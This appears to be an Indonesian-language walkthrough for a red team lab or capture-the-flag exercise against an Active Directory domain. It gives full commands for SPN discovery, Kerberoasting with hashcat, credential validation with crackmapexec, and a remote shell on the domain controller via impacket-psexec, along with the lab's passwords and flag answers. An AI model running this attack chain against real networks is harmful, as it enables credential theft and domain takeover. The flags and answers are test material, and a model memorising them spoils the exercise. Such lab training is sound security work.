# Walkthrough Red Team

Semua task disubmit sebagai flag. Format: `FLAG{...}`.

## Info Awal

```text
Domain   : corp.local
DC IP    : 10.10.10.10
Username : jdoe
Password : User@123
```

## Persiapan

Set DNS Kali ke DC:

```bash
echo "nameserver 10.10.10.10" | sudo tee /etc/resolv.conf
echo "10.10.10.10 dc01.corp.local corp.local" | sudo tee -a /etc/hosts
```

Cek koneksi:

```bash
ping -c 3 10.10.10.10
nmap -p 53,88,389,445 10.10.10.10
```

Validasi credential:

```bash
crackmapexec smb 10.10.10.10 -d corp.local -u jdoe -p 'User@123'
```

Jika Kerberos time skew:

```bash
sudo ntpdate 10.10.10.10
```

## RT-F01: Target IP

Task: berapa IP address Domain Controller target?

Finding:

```text
10.10.10.10
```

Submit flag:

```text
FLAG{10.10.10.10}
```

## RT-F02: SPN Discovery

Task: temukan account pemilik SPN `HTTP/web01.corp.local`.

Command:

```bash
impacket-GetUserSPNs corp.local/jdoe:'User@123' -dc-ip 10.10.10.10
```

Cari output:

```text
svc_web    HTTP/web01.corp.local
```

Finding:

```text
svc_web
```

Submit flag:

```text
FLAG{svc_web}
```

## RT-F03: Crack Password svc_web

Task: request TGS lalu crack password `svc_web`.

Request TGS:

```bash
impacket-GetUserSPNs corp.local/jdoe:'User@123' \
  -dc-ip 10.10.10.10 \
  -request \
  -outputfile hashes.txt
```

Cek hash:

```bash
cat hashes.txt
```

Crack RC4 (`$krb5tgs$23`):

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 13100 hashes.txt
```

Crack AES256 (`$krb5tgs$18`):

```bash
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 19700 hashes.txt
```

Expected finding:

```text
svc_web:Welcome1
```

Submit flag:

```text
FLAG{Welcome1}
```

## RT-F04: Privileged Service Account

Task: temukan service account yang punya akses admin.

Expected cracked account:

```text
svc_admin:Password123!
```

Validasi:

```bash
crackmapexec smb 10.10.10.10 -d corp.local -u svc_admin -p 'Password123!' --shares
```

Jika terlihat `ADMIN$` / `C$`, account privileged.

Submit flag:

```text
FLAG{svc_admin}
```

## RT-F05: Domain Admin Flag

Task: ambil flag di Desktop Administrator.

Remote shell:

```bash
impacket-psexec corp.local/svc_admin:'Password123!'@10.10.10.10
```

Di shell Windows:

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\flag3.txt
```

Expected output:

```text
FLAG{kerberoast_to_domain_admin}
```

Submit flag:

```text
FLAG{kerberoast_to_domain_admin}
```

## Troubleshooting

### `rockyou.txt` belum ada

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### `best64.rule` tidak ada

Rule tidak wajib. Pakai tanpa rule:

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Hashcat mode salah

```text
$krb5tgs$23 -> -m 13100
$krb5tgs$18 -> -m 19700
```

### `No entries found`

SPN belum dibuat atau credential salah. Cek dari DC:

```powershell
setspn -T corp.local -Q */*
```
